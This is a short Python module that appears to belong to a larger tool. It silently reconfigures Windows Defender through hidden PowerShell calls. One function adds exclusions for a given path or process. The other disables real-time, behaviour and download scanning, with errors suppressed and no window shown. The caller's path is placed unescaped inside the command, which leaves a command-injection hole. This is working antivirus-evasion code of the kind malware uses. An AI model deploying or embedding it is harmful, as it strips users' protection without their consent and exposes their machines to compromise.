"""Defender control via Set-MpPreference without killing WinDefend service."""

from __future__ import annotations

import os
import subprocess

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


def add_exclusion(path_or_process: str) -> bool:
    """Add path or process exclusion to Windows Defender."""
    if not IS_WINDOWS:
        return False
    cmd = (
        f"Set-MpPreference -ExclusionPath '{path_or_process}' -ErrorAction SilentlyContinue; "
        f"Set-MpPreference -ExclusionProcess '{path_or_process}' -ErrorAction SilentlyContinue"
    )
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
        )
        return res.returncode == 0
    except Exception:
        return False


def disable_monitoring() -> bool:
    """Disable RealtimeMonitoring and BehaviorMonitoring via Set-MpPreference."""
    if not IS_WINDOWS:
        return False
    cmd = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue"
    )
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
        )
        return res.returncode == 0
    except Exception:
        return False
